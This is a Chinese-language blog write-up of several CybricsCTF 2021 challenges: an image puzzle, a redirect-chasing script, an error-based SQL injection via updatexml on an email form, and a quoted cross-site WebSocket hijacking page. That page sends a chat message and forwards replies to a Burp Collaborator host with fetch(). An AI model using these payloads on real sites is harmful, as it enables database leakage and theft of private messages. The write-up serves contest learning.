---
title: "CybricsCTF2021 Wp"
slug: "cybricsctf2021-wp"
description: "依旧是签到水平，一些简单的misc+web"
date: 2021-07-27T14:32:12+08:00
categories: ["CTF"]
series: []
tags: ["wp", "participate"]
draft: false
toc: true
---

## Mic Check (Cyber, Baby, 50 pts)

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> Those organizers are changing [game rules](https://cybrics.net/rules) all the time! There’s a flag there, and it’s not that easy to capture.
>
> **Also be sure to join [@cybrics Telegram chat](https://t.me/cybrics)** for challenge-related announcements and contacting orgs in case all goes wrong
>
> **Added at 10:10 —** looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely

![image-20210724194428638](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png)



## Scanner (rebyC, Baby, 50 pts)

> Author: Mikhail Driagunov ([@aethereternity](https://t.me/aethereternity))
>
> Check out this cool new [**game**](https://scanner-cybrics2021.ctf.su/)!
>
> I heard they serve flags at level 5.

不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面

首先用[Gif Super](https://gifsuper.com/)把帧间隔调为300ms，然后裁剪出中间有用的部分 放入[GIF动态图片分解](http://www.atoolbox.net/Tool.php?Id=979)中看结果 都有在线工具就很方便

![image-20210724202614568](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png)

所以这个破玩意到底是啥？猪？还是刺猬？
别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone.... 最后一个是二维码 比较麻烦

![image-20210724203314255](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png)

再稍微调整一下尺寸，扫描就行了![image-20210724203713402](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png)



## Ad Network (Web, Baby, 50 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.
>
> [Adnetwork website](http://adnetwork-cybrics2021.ctf.su/)
>
> There is a flag 1337 redirects deep into the network...

~~这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？~~

emmmm 现在是第二天 正好有个空闲时间 想再试一试这个题 用的是burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图。
这个图在昨天做的时候看到， 内容是 *awesome ad from adnetwork*，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的....

![image-20210725133924877](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png)

在burp自带的chromium中 点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄

![image-20210725134346221](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png)

```python
import requests

url = "http://adnetwork-cybrics2021.ctf.su/adnetwork"
for _ in range(1337):
	r = requests.get(url, allow_redirects=False)
    url = r.text[9:-18]
print(url)

```

emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}

比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便

```python
import requests

session = requests.Session()
session.max_redirects = 1337

url = "http://adnetwork-cybrics2021.ctf.su/adnetwork"
r = session.get(url, allow_redirects=True)

print(r.text)
print(r.url)

```



## Announcement (Web, Easy, 60 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> Ladies and gentlemen!
>
> Allow us to introduce a brand new project —
> ⚐ The Flag
>
> [Announcement website](http://announcement-cybrics2021.ctf.su/)

简约漂亮的前端

有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&email=xxxx
尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5('1@1.com') 随email而改变，尝试注入

```
digest=76af11f3eaf7b12e72d7d88e4cf2ee01&email='or'1		// 回显正常 无报错
digest=c3593d255957d60d5d489ae682da8aee&email=1')#		// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&email=1',1)#	// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
```

确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？

```sql
insert into table_name (email, timestamp) values (email, now());
```

可利用的部分是可以插入的email，报错注入

```
digest=e1e79bd6fafe38f7073ec1f3ef1513fa&email=1',1 or updatexml(1,concat(0x7e,database()),0))#		// Something went wrong during database insert: XPATH syntax error: '~announcement'

```

（当时算是做了一半 然后出门了 这几天放假回家 先和朋友玩两三天 抽空把剩下的写了



## Multichat (Web, Medium, 138 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.
>
> Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): "`Hey, i forgot the flag. Can you remind me?`". Then admin will tell him the flag.
>
> [Multichat website](http://multichat-cybrics2021.ctf.su/)
>
> Team token for the support call: `p32vhJKrnx_hajUc8nLTFw`

聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样

抓包，看到了`Connection: Upgrade`  `Upgrade: websocket`，这个聊天室是建立了一个websocket连接

![image-20210724225447805](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png)（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面

链接里的一个csrf攻击的实例跟这个有点像了

![image-20210724232946228](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png)

但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（*Admin and tech support are members of a secret chat room.*）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话？ 跟题目里那个team token有无关系？）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag

具体的实现不知道该怎么弄了

看了tg里有老哥发的脚本是这样的

```html
<!DOCTYPE html>
<html>

<head>
  <script>
    let conn = new WebSocket("ws://multichat-cybrics2021.ctf.su/ws");
    conn.onopen = function (evt) {
      conn.send("Hey, i forgot the flag. Can you remind me?");
    };
    conn.onmessage = function (evt) {
      fetch("http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/" + btoa(evt.data));
      fetch("http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/aha",
        {
          method: 'POST',
          mode: 'no-cors',
          body: evt.data
        });
    };
  </script>
</head>

<body>
  Well cum
</body>

</html>
```

emmmm 是我想复杂了？看样子跟前面的cookie没有半毛钱关系 中间用的burp collaborator server之前在做portswigger的题的时候有用到过 但当时也没细究这个是干什么的（查了资料 相关链接还是放后面了 这个确实功能还挺强大的 可以可以）
自己复现了一下，emmmm 没成功.......? 是哪里出了问题？

tg上看到另一种解法是xss？也没打通



参考：[HTML5 WebSocket](https://www.runoob.com/html/html5-websocket.html)    [WebSocket安全问题分析](https://wiki.wgpsec.org/knowledge/web/websocket-sec.html)    [Request.mode](https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode)    [使用 Fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch)    [WorkerOrGlobalScope.fetch()](https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch)    [Burpsuite Collaborato模块详解](https://www.freebuf.com/news/193447.html)    [Running Your Instance of Burp Collaborator Server](https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/)（列入待完成计划

